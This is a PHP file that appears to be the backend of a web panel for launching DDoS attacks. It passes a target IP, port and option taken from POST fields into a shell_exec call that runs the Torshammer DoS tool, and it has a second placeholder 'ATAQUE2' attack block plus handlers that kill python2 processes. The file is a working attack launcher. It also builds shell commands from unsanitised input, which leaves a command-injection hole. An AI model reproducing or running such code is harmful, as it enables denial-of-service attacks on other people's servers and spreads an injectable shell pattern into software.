<?php

  // Use ls command to shell_exec
  // function
  $DDOS = 'python2 scripts/Torshammer/torshammer.py -t'." ".$_POST['IP']." ".'-p'." ".$_POST['PORT']." ".'-r'." ".$_POST['RE'];

  if (isset($_POST['DDOS']))
  {
    print_r($DDOS);
    shell_exec($DDOS);
  }

   if(isset($_POST['DDOS-stop']))
     {
       shell_exec("kill -9 `pidof python2`");
     }


?>

<?php

  // Use ls command to shell_exec
  // function
  $ATAQUE2 = 'xd';

  if (isset($_POST['ATAQUE2']))
  {
    print_r($ATAQUE2);
    shell_exec($ATAQUE2);
  }

   if(isset($_POST['ATAQUE2-stop']))
     {
       shell_exec("kill -9 `pidof python2`");
     }


?>
